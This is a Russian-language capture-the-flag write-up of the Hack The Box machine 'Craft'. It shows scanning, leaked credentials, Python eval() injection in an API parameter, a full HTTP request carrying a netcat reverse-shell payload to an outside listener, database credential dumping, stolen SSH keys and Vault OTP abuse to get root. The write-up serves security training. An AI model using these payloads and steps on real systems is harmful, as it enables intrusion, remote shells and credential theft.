```bash
sudo nmap -Pn -n --min-rate=1000 10.129.8.233 -p- -oN discovery/full-tcp
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603161811.png)

Сканирование nmap показало три открытых TCP порта: 22, 443 и 6022

```bash
sudo nmap -Pn -n -sV -sC 10.129.8.233 -p22,443,6022 -oN discovery/services
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603162022.png)

Из сканирования сервисов достаем хост `craft.htb` и добавляем его в `/etc/hosts`

```bash
echo "10.129.8.233 craft.htb" | sudo tee -a /etc/hosts
```

На TCP/443 работает страница-заглушка с ссылками на `gogs.craft.htb` и `api.craft.htb`. Также добавим их в `/etc/hosts`.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603162428.png)
 
На `gogs.craft.htb` видим работающий self-hosted git сервис Gogs. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603162854.png)

В разделе `Explore` находится публичный репозиторий `craft-api`, который, судя по всему, содержит исходный код `api.craft.htb`. 

В репозитории видим задачу, описывающую проблему недостаточной валидации параметра `abv`. На это стоит обратить внимание при дальнейшем анализе кода. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603163405.png)

Загрузим репозиторий локально и откроем с помощью `Codium` для удобного просмотра истории коммитов. 

```bash
# используем sslVerify=false для сапомодписного сертификата
git -c http.sslVerify=false clone https://gogs.craft.htb/Craft/craft-api.git
```

Довольно быстро находим учетные данные пользователя `dinesh`.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603165051.png)

Пробуем использовать найденную пару для `api.craft.htb` и в ответ получаем токен. Это говорит о том, что данные все еще валидны.

```bash
curl https://api.craft.htb/api/auth/login -k  -u"dinesh:4aUh0A8PbVJxgd"
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603165428.png)

Для анализа исходного кода используем инструмент `opengrep`. 

```
opengrep scan craft-api/
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603173917.png)

В выводе видим использование функции `eval()`, которая использует контролируемый пользователем параметр `adv` без валидации. Это позволяет выйти в RCE с помощью передачи в параметр значения вида  `__import__('os').system("whoami")`.

```python
@api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```

Запускаем слушатель и формируем запрос для вызова reverse-shell. Не забываем прикрепить токен, полученный ранее.

```http
POST /api/brew/ HTTP/1.1
Host: api.craft.htb
User-Agent: curl/8.14.1
Accept: */*
X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzgwNTA3MTU5fQ.xdxxQZ_Hc8CrWiGnZgRe8s-vUXiP5OOnETd3C0qZpSM
Content-Type: application/json
Content-Length: 177
Connection: keep-alive

{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.123 9001 >/tmp/f')"}
```

Через несколько секунд получаем приглашение от `root` пользователя. Судя по файлу `.dockerenv` в корне мы находимся в docker-контейнере.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603221554.png)

Для удобства стабилизируем шелл до интерактивного с помощью `python.pty`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# ^z
stty raw -echo; fg
```

В директории с приложением видим интересный файл `settings.py`, который содержит параметры подключения к базе данных.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603222012.png)

```
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

Попробуем посмотреть доступные таблицы. Для этого пишем скрипт на python, который подключается к базе по найденным учетным данным.

```python
import pymysql

conn = pymysql.connect(
    host="db",
    user="craft",
    password="qLGockJ6G2J75O",
    database="craft"
)

cursor = conn.cursor()
cursor.execute("SHOW TABLES")

for table in cursor.fetchall():
    print(table[0])

cursor.close()
conn.close()
```

Запускаем HTTP-сервер и загружаем файл на жертву с помощью `wget`. Вывод показывает наличие двух таблиц - `brew` и `user`

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603223937.png)

Модифицируем скрипт, чтобы вытащить все содержимое таблицы `user`.

```python
<SNIP>
cursor.execute("SELECT * FROM users")

columns = [desc[0] for desc in cursor.description]
print(columns)

for row in cursor.fetchall():
    print(row)
<SNIP>
```

Вывод показывает несколько пар логин-пароль.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603224531.png)

```
(1, 'dinesh', '4aUh0A8PbVJxgd')
(4, 'ebachman', 'llJ77D8QFkLPQB')
(5, 'gilfoyle', 'ZEU3N8WNM2rh4T')
```

Используем полученные данные для входа на Gogs. Под учетной записью `gilfoyle` видим интересный закрытый репозиторий `craft-infra`.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603224621.png)

В репозитории содержатся ssh-ключи. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603224742.png)

Сохраним их локально и попробуем использовать для подключения к машине. Так мы получаем доступ к машине и флаг пользователя.

```bash
ssh gilfoyle@craft.htb -i id_rsa
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603230427.png)

В домашней директории находится файл `.vault-token` со следующим содержимым. 

```
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

Это кэш-файл, который создал HashiCorp Vault во время удачной аутентификации. Это позволит нам использовать Vault API во время эскалации привилегий.

В репозитории `craft-infra` содержится файл `secrets.sh`, содержащий настройку vault.

```bash
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0

```

В нем мы видим генерацию OTP ключей для пользователя root во время ssh-подключений. Попробуем достать OTP с помощью vault API ([документация](https://developer.hashicorp.com/vault/docs/commands/ssh))

```bash
vault ssh -mode=otp -role=root_otp root@127.0.0.1
```

И так мы легко получаем shell от root пользователя.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/craft/Pasted%20image%2020260603232246.png)

---
#web #pentest #writeup 
